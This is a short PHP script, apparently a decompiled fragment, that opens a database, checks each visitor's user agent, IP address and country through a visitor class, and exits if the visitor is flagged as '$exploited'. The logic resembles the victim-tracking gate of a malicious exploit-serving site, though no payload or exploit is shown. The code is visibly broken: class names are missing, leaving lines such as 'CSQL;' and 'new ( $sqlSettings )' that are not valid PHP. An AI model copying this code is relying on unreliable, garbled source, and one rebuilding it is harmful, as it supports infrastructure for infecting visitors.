<?php


include_once( 'config.php' );
include_once( 'include/sql.php' );
include_once( 'include/visitors.php' );
CSQL;
$sql = new ( $sqlSettings );
$sql->open(  );
CVisitors;
$cvisitors = new ( $sql, $sqlSettings );
$exploited = $cvisitors->checkVisitor( $_SERVER['HTTP_USER_AGENT'], $cvisitors->getIpAddr(  ), $cvisitors->getIpAddrCountry( $cvisitors->getIpAddr(  ) ) );
$sql->close(  );

if ($exploited) {
	exit(  );
}

?>
